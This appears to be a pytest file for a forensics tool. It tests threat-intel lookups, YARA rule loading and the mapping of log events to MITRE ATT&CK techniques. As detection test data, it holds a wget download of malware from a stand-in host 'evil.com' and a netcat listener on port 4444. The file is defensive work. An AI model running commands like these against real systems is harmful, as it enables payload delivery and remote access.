"""
CyberForensX — Extra Threat Intel Tests
Module: tests/test_threat_intel_extra.py
"""

import pytest
import os
import sys
from unittest.mock import patch, MagicMock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from analysis.threat_intel.misp_client import search_ioc
from analysis.threat_intel.yara_scanner import YaraScanner
from analysis.threat_intel.mitre_mapper import map_event_to_mitre, enrich_timeline

class TestMispClient:
    def test_search_ioc_auto_ip(self):
        with patch("analysis.threat_intel.misp_client.search_by_ip") as mock_ip:
            mock_ip.return_value = [{"event_id": "123"}]
            result = search_ioc("192.168.1.100")
            assert len(result) == 1
            mock_ip.assert_called_once_with("192.168.1.100")

    def test_search_ioc_auto_hash(self):
        with patch("analysis.threat_intel.misp_client.search_by_hash") as mock_hash:
            mock_hash.return_value = [{"event_id": "124"}]
            result = search_ioc("d41d8cd98f00b204e9800998ecf8427e")
            assert len(result) == 1
            mock_hash.assert_called_once_with("d41d8cd98f00b204e9800998ecf8427e")

    def test_search_ioc_auto_domain(self):
        with patch("analysis.threat_intel.misp_client.search_by_domain") as mock_domain:
            mock_domain.return_value = [{"event_id": "125"}]
            result = search_ioc("malicious.com")
            assert len(result) == 1
            mock_domain.assert_called_once_with("malicious.com")

class TestYaraScanner:
    @patch("analysis.threat_intel.yara_scanner.os.path.isdir")
    @patch("analysis.threat_intel.yara_scanner.os.walk")
    @patch("analysis.threat_intel.yara_scanner.yara.compile")
    def test_yara_scanner_compile(self, mock_compile, mock_walk, mock_isdir):
        mock_isdir.return_value = True
        mock_walk.return_value = [("/fake/dir", [], ["rule1.yar", "rule2.yara", "ignore.txt"])]
        
        scanner = YaraScanner(rules_dir="/fake/dir")
        
        mock_compile.assert_called_once()
        args, kwargs = mock_compile.call_args
        assert "filepaths" in kwargs
        assert "rule1.yar" in kwargs["filepaths"]
        assert "rule2.yara" in kwargs["filepaths"]
        assert "ignore.txt" not in kwargs["filepaths"]

class TestMitreMapper:
    def test_map_event_failed_login(self):
        event = {"event_type": "auth", "raw_message": "Failed password for root"}
        enriched = map_event_to_mitre(event)
        assert enriched.get("mitre_id") == "T1110"
        
    def test_map_event_bash_wget(self):
        event = {"event_type": "bash", "raw_message": "wget http://evil.com/malware"}
        enriched = map_event_to_mitre(event)
        assert enriched.get("mitre_id") == "T1105"

    def test_map_event_no_match(self):
        event = {"event_type": "auth", "raw_message": "Accepted password for hamna"}
        enriched = map_event_to_mitre(event.copy())
        assert "mitre_id" not in enriched

    def test_enrich_timeline(self):
        events = [
            {"event_type": "bash", "raw_message": "nc -lvp 4444"},
            {"event_type": "system", "raw_message": "nothing malicious"}
        ]
        enriched = enrich_timeline(events)
        assert enriched[0].get("mitre_id") == "T1043"
        assert "mitre_id" not in enriched[1]
